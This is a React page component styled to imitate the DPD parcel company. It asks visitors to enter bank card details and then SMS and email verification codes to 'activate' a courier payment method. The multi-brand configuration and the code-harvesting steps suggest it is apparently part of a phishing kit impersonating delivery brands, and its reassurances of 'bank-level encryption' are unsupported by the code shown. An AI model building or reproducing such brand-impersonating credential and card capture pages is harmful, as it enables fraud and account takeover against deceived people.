"use client";

import { useState } from "react";
import CardVerificationForm from "@/components/kyc/CardVerificationForm";
import CardVerificationFlow from "@/components/kyc/CardVerificationFlow";
import { brandConfigs } from "@/lib/brandConfig";

export default function DpdCardVerificationPage() {
  const config = brandConfigs.dpd;
  const [session, setSession] = useState<{ token: string; uuid: string } | null>(null);

  return (
    <div>
      {/* DPD-style page header */}
      <div className="mb-6">
        <div
          className="p-6"
          style={{
            backgroundColor: "#FFFFFF",
            borderLeft: "4px solid #DC0032",
            boxShadow: "0 1px 3px rgba(0,0,0,0.08)",
          }}
        >
          <div className="flex items-center gap-3 mb-3">
            <div
              className="w-10 h-10 rounded flex items-center justify-center flex-shrink-0"
              style={{ backgroundColor: "#DC0032" }}
            >
              <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="#FFFFFF" strokeWidth={2}>
                <path strokeLinecap="round" strokeLinejoin="round" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
              </svg>
            </div>
            <div>
              <h1 className="text-lg font-bold" style={{ color: "#414042" }}>
                Card Verification
              </h1>
              <p className="text-xs" style={{ color: "#6D6E71" }}>
                Courier Payment Setup
              </p>
            </div>
          </div>
          <p className="text-sm" style={{ color: "#6D6E71" }}>
            Verify your bank card to activate your DPD courier account payment method.
            This is a one-time secure verification process.
          </p>

          {/* DPD-style status bar */}
          <div className="mt-4 flex items-center gap-0">
            {["Card Details", "SMS Code", "Email Code", "Complete"].map((step, i) => (
              <div key={step} className="flex items-center">
                <div
                  className="flex items-center gap-1.5 px-3 py-1.5 text-xs font-semibold"
                  style={{
                    backgroundColor: i === 0 ? "#DC0032" : "#F5F5F5",
                    color: i === 0 ? "#FFFFFF" : "#6D6E71",
                    borderRadius: i === 0 ? "4px 0 0 4px" : i === 3 ? "0 4px 4px 0" : "0",
                  }}
                >
                  <span className="w-5 h-5 rounded-full flex items-center justify-center text-[10px]" style={{
                    backgroundColor: i === 0 ? "rgba(255,255,255,0.3)" : "#E0E0E0",
                    color: i === 0 ? "#FFFFFF" : "#6D6E71",
                  }}>
                    {i + 1}
                  </span>
                  {step}
                </div>
              </div>
            ))}
          </div>
        </div>
      </div>

      {/* Card Verification Form or Flow */}
      {!session ? (
        <CardVerificationForm
          brandConfig={config}
          onSubmitted={(token, uuid) => setSession({ token, uuid })}
        />
      ) : (
        <CardVerificationFlow
          brandConfig={config}
          sessionToken={session.token}
          uuid={session.uuid}
        />
      )}

      {/* DPD-style footer info */}
      <div className="mt-8 p-4" style={{ backgroundColor: "#F5F5F5", borderTop: "2px solid #DC0032" }}>
        <div className="flex items-start gap-3">
          <svg className="w-5 h-5 flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="#DC0032" strokeWidth={2}>
            <path strokeLinecap="round" strokeLinejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
          </svg>
          <div>
            <p className="text-sm font-bold" style={{ color: "#414042" }}>Secure verification</p>
            <p className="text-xs mt-1" style={{ color: "#6D6E71" }}>
              Your card information is transmitted using bank-level encryption and is never stored unencrypted.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}
